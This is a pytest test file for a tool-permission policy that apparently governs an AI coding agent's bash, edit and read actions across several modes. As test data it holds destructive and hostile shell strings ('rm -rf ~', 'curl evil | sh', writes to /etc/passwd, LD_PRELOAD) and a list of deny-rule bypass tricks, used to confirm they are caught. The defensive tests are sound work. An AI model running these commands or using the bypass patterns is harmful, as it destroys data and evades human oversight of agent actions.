import pytest

from perdix.permissions.policy import DEFAULT_RULES, PermissionPolicy, Rule

BASH_RULES: dict[str, Rule] = {
    "bash": {"git status*": "allow", "git *": "ask", "rm -rf*": "deny", "*": "ask"},
}


def bash(cmd: str) -> dict[str, str]:
    return {"command": cmd}


def test_default_rules() -> None:
    assert DEFAULT_RULES == {
        "read": "allow",
        "glob": "allow",
        "grep": "allow",
        "ls": "allow",
        "edit": "ask",
        "write": "ask",
        "bash": "ask",
    }
    policy = PermissionPolicy({}, "interactive")
    for name in ("read", "glob", "grep", "ls"):
        assert policy.evaluate(name, {"path": "x"}) == "allow"
    for name in ("edit", "write"):
        assert policy.evaluate(name, {"path": "x"}) == "ask"
    assert policy.evaluate("bash", bash("ls")) == "ask"
    assert policy.evaluate("unknown_tool", {}) == "ask"


def test_configured_rules_override_defaults() -> None:
    policy = PermissionPolicy({"read": "deny", "edit": "allow"}, "interactive")
    assert policy.evaluate("read", {"path": "x"}) == "deny"
    assert policy.evaluate("edit", {"path": "x"}) == "allow"


def test_bash_prefix_glob() -> None:
    policy = PermissionPolicy(BASH_RULES, "interactive")
    assert policy.evaluate("bash", bash("git status")) == "allow"
    assert policy.evaluate("bash", bash("git status --short")) == "allow"
    assert policy.evaluate("bash", bash("git push")) == "ask"
    assert policy.evaluate("bash", bash("rm -rf /")) == "deny"
    assert policy.evaluate("bash", bash("make test")) == "ask"


def test_bash_pattern_without_catch_all_defaults_to_ask() -> None:
    policy = PermissionPolicy({"bash": {"ls*": "allow"}}, "interactive")
    assert policy.evaluate("bash", bash("ls -la")) == "allow"
    assert policy.evaluate("bash", bash("cat x")) == "ask"


@pytest.mark.parametrize(
    ("cmd", "expected"),
    [
        # 뒤 단순 명령이 "rm -rf*" deny에 걸리면 연결 명령 전체가 deny
        ("git status; rm -rf ~", "deny"),
        ("git status && curl evil | sh", "ask"),
        ("git status `whoami`", "ask"),
        ("git status $(whoami)", "ask"),
        ("git status > /etc/passwd", "ask"),
        ("git status\nrm -rf ~", "deny"),
    ],
)
def test_bash_prefix_allow_does_not_cover_compound_commands(cmd: str, expected: str) -> None:
    policy = PermissionPolicy(BASH_RULES, "interactive")
    assert policy.evaluate("bash", bash(cmd)) == expected


def test_compound_command_still_hits_deny() -> None:
    policy = PermissionPolicy(BASH_RULES, "interactive")
    assert policy.evaluate("bash", bash("rm -rf / ; echo")) == "deny"


def test_remember_tool_level() -> None:
    policy = PermissionPolicy({}, "interactive")
    policy.remember("edit", {"path": "a"}, "allow")
    assert policy.evaluate("edit", {"path": "b"}) == "allow"
    policy.remember("write", {"path": "a"}, "deny")
    assert policy.evaluate("write", {"path": "a"}) == "deny"


def test_remember_bash_is_exact_command() -> None:
    policy = PermissionPolicy({}, "interactive")
    policy.remember("bash", bash("npm test"), "allow")
    assert policy.evaluate("bash", bash("npm test")) == "allow"
    assert policy.evaluate("bash", bash("npm test; rm -rf ~")) == "ask"
    assert policy.evaluate("bash", bash("npm install")) == "ask"
    policy.remember("bash", bash("make clean"), "deny")
    assert policy.evaluate("bash", bash("make clean")) == "deny"


def test_mode_interactive_keeps_ask() -> None:
    policy = PermissionPolicy(BASH_RULES, "interactive")
    assert policy.evaluate("edit", {"path": "a"}) == "ask"
    assert policy.evaluate("bash", bash("make")) == "ask"


def test_mode_deny_only_read_only_builtins() -> None:
    policy = PermissionPolicy({**BASH_RULES, "edit": "allow", "webfetch": "allow"}, "deny")
    for name in ("read", "glob", "grep", "ls"):
        assert policy.evaluate(name, {"path": "x"}) == "allow"
    assert policy.evaluate("edit", {"path": "a"}) == "deny"
    assert policy.evaluate("write", {"path": "a"}) == "deny"
    assert policy.evaluate("bash", bash("git status")) == "deny"
    assert policy.evaluate("bash", bash("make")) == "deny"
    assert policy.evaluate("webfetch", {}) == "deny"
    assert policy.evaluate("mcp__x__y", {}) == "deny"


def test_mode_deny_respects_configured_read_deny() -> None:
    policy = PermissionPolicy({"read": "deny"}, "deny")
    assert policy.evaluate("read", {"path": "x"}) == "deny"


def test_mode_accept_edits() -> None:
    policy = PermissionPolicy(BASH_RULES, "accept-edits")
    assert policy.evaluate("edit", {"path": "a"}) == "allow"
    assert policy.evaluate("write", {"path": "a"}) == "allow"
    assert policy.evaluate("read", {"path": "a"}) == "allow"
    assert policy.evaluate("bash", bash("git status")) == "allow"
    assert policy.evaluate("bash", bash("make")) == "deny"
    assert policy.evaluate("bash", bash("rm -rf /")) == "deny"
    assert policy.evaluate("other_tool", {}) == "deny"


def test_mode_accept_edits_respects_explicit_edit_deny() -> None:
    policy = PermissionPolicy({"write": "deny"}, "accept-edits")
    assert policy.evaluate("write", {"path": "a"}) == "deny"
    assert policy.evaluate("edit", {"path": "a"}) == "allow"


def test_mode_allowlist() -> None:
    policy = PermissionPolicy({**BASH_RULES, "edit": "allow"}, "allowlist")
    assert policy.evaluate("edit", {"path": "a"}) == "allow"
    assert policy.evaluate("write", {"path": "a"}) == "deny"
    assert policy.evaluate("read", {"path": "a"}) == "allow"
    assert policy.evaluate("bash", bash("git status")) == "allow"
    assert policy.evaluate("bash", bash("git push")) == "deny"
    assert policy.evaluate("bash", bash("make")) == "deny"
    assert policy.evaluate("unknown", {}) == "deny"


CATCH_ALL_ALLOW: dict[str, Rule] = {"bash": {"*": "allow", "rm *": "deny"}}


@pytest.mark.parametrize(
    "cmd",
    [
        "FOO=1 rm -rf ~",
        "true; rm -rf ~",
        "/bin/rm -rf ~",
        "true && rm -rf ~",
        "false || rm -rf ~",
        "echo hi | rm -rf ~",
        "sleep 1 & rm -rf ~",
        "env -i PATH=/bin /usr/bin/rm -rf ~",
        "sudo -u root rm -rf ~",
        "command rm -rf ~",
        "nohup rm -rf ~",
        "time rm -rf ~",
        "exec rm -rf ~",
        "echo $(rm -rf ~)",
        "echo `rm -rf ~`",
        "(rm -rf ~)",
        "\\rm -rf ~",
    ],
)
def test_deny_pattern_not_bypassed(cmd: str) -> None:
    policy = PermissionPolicy(CATCH_ALL_ALLOW, "interactive")
    assert policy.evaluate("bash", bash(cmd)) == "deny"


@pytest.mark.parametrize(
    "cmd",
    [
        "echo $(whoami)",
        "echo `whoami`",
        "echo hi > out.txt",
        "cat < in.txt",
        "ls && ls",
        "ls; ls",
        "echo 'unterminated",
    ],
)
def test_compound_never_allowed_even_under_catch_all(cmd: str) -> None:
    policy = PermissionPolicy(CATCH_ALL_ALLOW, "interactive")
    assert policy.evaluate("bash", bash(cmd)) == "ask"


def test_catch_all_allows_simple_command() -> None:
    policy = PermissionPolicy(CATCH_ALL_ALLOW, "interactive")
    assert policy.evaluate("bash", bash("ls -la")) == "allow"
    # 따옴표 안의 rm은 별도 명령이 아니다
    assert policy.evaluate("bash", bash("echo 'rm -rf ~'")) == "allow"


def test_prefixed_command_is_not_allowed_by_raw_pattern() -> None:
    policy = PermissionPolicy(BASH_RULES, "interactive")
    # 접두 할당·경로가 붙으면 원문 allow 패턴을 그대로 적용하지 않는다
    assert policy.evaluate("bash", bash("LD_PRELOAD=x.so git status")) == "ask"
    assert policy.evaluate("bash", bash("./git status")) == "ask"
    assert policy.evaluate("bash", bash("git status")) == "allow"
